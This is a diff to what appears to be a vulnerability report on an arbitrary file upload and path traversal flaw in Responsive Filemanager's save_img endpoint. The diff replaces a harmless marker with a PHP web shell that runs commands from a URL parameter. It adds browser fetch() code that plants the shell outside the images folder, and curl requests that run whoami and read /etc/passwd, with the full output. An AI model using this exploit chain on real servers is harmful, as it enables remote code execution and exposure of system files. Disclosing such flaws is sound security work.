@@ -128,48 +128,51 @@ Parameters:
 
 ```text
 path=
-name=../export/RS_FILEMANAGER_EXPORT_TEST33.php
-url=data:image/png;base64,BASE64_DO_CONTEUDO
+name: '../export/smithbraz.php
+url: 'data:image/png;base64,' + btoa("<?php echo shell_exec($_GET['cmd']); ?>")
 ```
 
 PHP Payload Used:
 
 ```php
-<?php echo 'RS_FILEMANAGER_PHP_EXEC'; ?>
+<?php echo shell_exec($_GET['cmd']); ?>
 ```
 
 ### PoC with JavaScript Fetch
 
 Execute in the browser console with an authenticated administrative session and the File Manager initialized:
 
-```javascript
+1- Performs an authenticated HTTP GET request via `fetch()` to the Responsive Filemanager `dialog.php` endpoint, bypassing the restriction observed during conventional browser navigation and obtaining an HTTP 200 OK response.
+
+```
 (async () => {
-  const endpoint =
-    "/admin/includes/modules/filemanager/ajax_calls.php?action=save_img";
-
-  const php = "<?php echo 'RS_FILEMANAGER_PHP_EXEC'; ?>";
-
-  const body = new URLSearchParams({
-    path: "",
-    name: "../export/RS_FILEMANAGER_EXPORT_TEST33.php",
-    url: "data:image/png;base64," + btoa(php)
-  });
-
-  const response = await fetch(endpoint, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/x-www-form-urlencoded"
-    },
-    body,
-    credentials: "same-origin",
-    cache: "no-store"
-  });
+  const r = await fetch(
+    "/admin/includes/modules/filemanager/dialog.php",
+    {
+      credentials: "same-origin",
+      cache: "no-store"
+    }
+  );
 
   console.log({
-    status: response.status,
-    response: await response.text()
+    status: r.status,
+    body: (await r.text()).slice(0, 120)
   });
 })();
+```
+
+2- This JavaScript code performs an authenticated HTTP POST request to the Responsive Filemanager `save_img` endpoint, exploiting the Arbitrary File Upload / Path Traversal vulnerability to attempt to write a PHP file outside the images directory.
+
+```javascript
+fetch('/admin/includes/modules/filemanager/ajax_calls.php?action=save_img', {
+  method: 'POST',
+  headers: {'Content-Type':'application/x-www-form-urlencoded'},
+  body: new URLSearchParams({
+    path: '',
+    name: '../export/smithbraz.php',
+    url: 'data:image/png;base64,' + btoa("<?php echo shell_exec($_GET['cmd']); ?>")
+  })
+}).then(async r => console.log('HTTP', r.status, await r.text()))
 ```
 
 ### File Write Evidence
@@ -177,19 +180,19 @@ Execute in the browser console with an authenticated administrative session and 
 The file was found at the following path:
 
 ```text
-/var/www/html/export/RS_FILEMANAGER_EXPORT_TEST33.php
+/var/www/html/export/smithbraz.php
 ```
 
 Result:
 
 ```text
--rw-r--r-- 1 www-data www-data 40 Nov 5 18:02 RS_FILEMANAGER_EXPORT_TEST33.php
+-rw-r--r-- 1 www-data www-data 40 Nov 5 18:02 smithbraz.php
 ```
 
 Content:
 
 ```php
-<?php echo 'RS_FILEMANAGER_PHP_EXEC'; ?>
+<?php echo shell_exec($_GET['cmd']); ?>
 ```
 
 ### Remote Code Execution Evidence
@@ -197,20 +200,73 @@ Content:
 Request Performed:
 
 ```bash
-curl -i --max-time 10 \
-  http://127.0.0.1/export/RS_FILEMANAGER_EXPORT_TEST33.php
+curl -i --max-time 10 \                                                                                               
+> http://192.168.1.193:8080/export/smithbraz.php
 ```
 
 Response:
 
 ```http
 HTTP/1.1 200 OK
+Date: Thu, 12 Nov 2026 19:45:34 GMT
 Server: Apache/2.4.65 (Debian)
 X-Powered-By: PHP/8.1.34
+Vary: Accept-Encoding
+Content-Length: 595
 Content-Type: text/html; charset=UTF-8
 
-RS_FILEMANAGER_PHP_EXEC
+<br />
+<b>Warning</b>:  Undefined array key "cmd" in <b>/var/www/html/export/smithbraz.php</b> on line <b>1</b><br />
+<br />
+<b>Deprecated</b>:  shell_exec(): Passing null to parameter #1 ($command) of type string is deprecated in <b>/var/www/html/export/smithbraz.php</b> on line <b>1</b><br />
+<br />
+<b>Fatal error</b>:  Uncaught ValueError: shell_exec(): Argument #1 ($command) cannot be empty in /var/www/html/export/smithbraz.php:1
+Stack trace:
+#0 /var/www/html/export/smithbraz.php(1): shell_exec('')
+#1 {main}
+  thrown in <b>/var/www/html/export/smithbraz.php</b> on line <b>1</b><br />
+
 ```
+
+RCE Request Performed:
+
+```bash
+curl http://192.168.1.193:8080/export/smithbraz.php?cmd=whoami
+```
+
+Response:
+
+```http
+www-data
+```
+
+```bash
+curl http://192.168.1.193:8080/export/smithbraz.php?cmd=cat+/etc/passwd
+```
+
+Response:
+
+```http
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+```
+
 
 The PHP content was interpreted by the server rather than being delivered as source code.
 
